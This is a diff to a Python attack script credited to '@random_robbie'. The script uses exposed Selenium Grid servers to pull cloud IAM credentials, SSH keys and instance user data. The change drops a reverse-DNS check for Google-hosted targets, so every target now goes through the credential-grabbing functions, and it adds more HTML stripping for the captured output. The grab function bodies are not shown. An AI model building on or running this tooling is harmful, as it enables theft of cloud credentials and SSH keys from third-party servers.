@@ -6,8 +6,6 @@
 # Author: @random_robbie
 
 import requests
-import dns.resolver
-import dns.reversename
 from urllib.parse import urlparse
 from selenium import webdriver
 from selenium.webdriver.common.desired_capabilities import DesiredCapabilities
@@ -22,10 +20,10 @@ def strip_html(striphtml):
 	striphtml.replace('<html xmlns="http://www.w3.org/1999/xhtml"><head></head><body><pre style="word-wrap: break-word; white-space: pre-wrap;">','')
 	striphtml2 = striphtml.replace('</pre></body></html>','')
 	striphtml3 = striphtml2.replace('<html xmlns="http://www.w3.org/1999/xhtml"><head></head><body><pre style="word-wrap: break-word; white-space: pre-wrap;">','')
-	return striphtml3
+	striphtml4 = striphtml3.replace('<html><head></head><body><pre style="word-wrap: break-word; white-space: pre-wrap;">','')
+	striphtml5 = striphtml4.replace('<pre style="word-wrap: break-word; white-space: pre-wrap;">','')
+	return striphtml5
 	
-def ipToArpaName(x): 
-	return '.'.join(x.split('.')[::-1]) + '.in-addr.arpa'
 
 def grab_sshgoogle(server,desired_caps):
 	grid_url = ""+server+"/wd/hub"
@@ -98,19 +96,9 @@ try:
 	args = parser.parse_args()
 	server = args.server
 	o = urlparse(server)
-	qname = dns.reversename.from_address(o.hostname)
-	answer = dns.resolver.query(qname, 'PTR')
-	for rr in answer:
-		#print(rr)
-	
-		if 'google' in str(rr):
-			desired_caps = DesiredCapabilities.CHROME
-			grab_sshgoogle(server,desired_caps)
-		else:
-	
-			desired_caps = DesiredCapabilities.CHROME
-			grab_iam (server,desired_caps)
-			grab_sshkeys (server,desired_caps)
-			grab_userdata (server,desired_caps)
+	desired_caps = DesiredCapabilities.CHROME
+	grab_iam (server,desired_caps)
+	grab_sshkeys (server,desired_caps)
+	grab_userdata (server,desired_caps)
 except Exception as e:
 		print (e)
